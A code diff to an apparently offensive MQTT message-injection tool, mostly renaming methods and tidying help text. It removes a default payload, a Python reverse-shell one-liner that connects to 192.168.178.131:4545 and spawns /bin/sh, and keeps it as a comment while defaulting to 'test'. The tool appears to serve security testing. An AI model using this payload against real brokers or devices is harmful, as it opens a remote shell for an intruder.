@@ -32,10 +32,10 @@ class InjectorMixin(InterfaceMixin):
     injector_parser.add_argument('-s', '--retain', action='store_true',
                                  help='Retain message to the server')
     injector_parser.add_argument('-l', '--loop', action='store_true',
-                                 help='Keep looping through and publishing packets forever')
+                                 help='Loop publishing packets forever')
     injector_parser.add_argument('-d', '--delay', action='store',
                                  default=100,
-                                 help='average delay between messages, ms')
+                                 help='Average delay between messages, ms')
 
     @with_category(InterfaceMixin.CMD_CAT_VICTIM_OP)
     @with_argparser(injector_parser)
@@ -45,21 +45,21 @@ class InjectorMixin(InterfaceMixin):
         if args.message_file is not None:
             messages, topics = load_messages(args.message_file)
         else:
-            messages = [('house/temperature',
-                         'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.131",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")')]
-        injector.set_replay_params(args.fuzz, args.randomise, args.qos, args.delay, args.retain)
+            # 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.131",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+            messages = [('house/temperature', 'test')]
+        injector.set_params(args.fuzz, args.randomise, args.qos, args.delay, args.retain)
         injector.run(messages, args.loop)
 
 
 class MQTTInjector(MQTTLogger):
-    def set_replay_params(self, fuzz=0, randomise=False, qos=0, delay_ms=100, retain=False):
+    def set_params(self, fuzz=0, randomise=False, qos=0, delay_ms=100, retain=False):
         self.fuzz = int(fuzz)
         self.randomise = randomise
         self.qos = int(qos)
         self.delay_ms = int(delay_ms)
         self.retain = retain
 
-    def do_delay(self):
+    def wait(self):
         if self.randomise:
             time.sleep(random.randint(0, self.delay_ms) / 1000)
         else:
@@ -86,12 +86,13 @@ class MQTTInjector(MQTTLogger):
 
             for p in modded_payloads:
                 qos = self.get_qos()
-                self.do_delay()
+                self.wait()
 
                 if fuzzed:  # print a different colour
                     self.msg_logger.bind(topic=topic, qos=qos).error(p)
                 else:
                     self.msg_logger.bind(topic=topic, qos=qos).warning(p)
+
                 publisher = self.client.publish(topic, p, qos=qos, retain=self.retain)
                 if self.delay_ms > 0:
                     publisher.wait_for_publish()
@@ -100,11 +101,11 @@ class MQTTInjector(MQTTLogger):
         self._connect(topics=[])
         self.client.loop_start()
 
-        keep_going = True
+        looping = True
         try:
-            while keep_going:
+            while looping:
                 self.republish_messages(messages)
-                keep_going = loop
+                looping = loop
         except KeyboardInterrupt:
             pass
         finally:
